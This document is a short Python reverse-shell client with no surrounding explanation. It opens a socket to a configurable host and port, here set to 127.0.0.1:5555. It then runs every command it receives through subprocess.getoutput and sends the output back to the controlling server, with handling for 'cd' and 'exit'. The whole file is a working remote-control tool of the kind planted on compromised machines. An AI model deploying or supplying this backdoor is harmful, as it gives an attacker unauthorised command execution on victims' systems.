import socket
import subprocess
import sys
import os

HOST = '127.0.0.1'  # IP address of the server
PORT = 5555        # Same port as the server


def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
    except Exception as e:
        sys.exit("Failed to connect to server: " + str(e))

    while True:
        command = s.recv(1024).decode()
        if not command:
            break
        try:
            if command.lower() == 'exit':
                s.send(command.encode())
                break
            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    output = f"Changed directory to {os.getcwd()}"
                except OSError as e:
                    output = f"Could not change directory: {e}"
            else:
                # receive output from client and print it
                output = subprocess.getoutput(command)
                s.send(output.encode())
        except:
            break
    s.close()
    sys.exit()


if __name__ == '__main__':
    main()
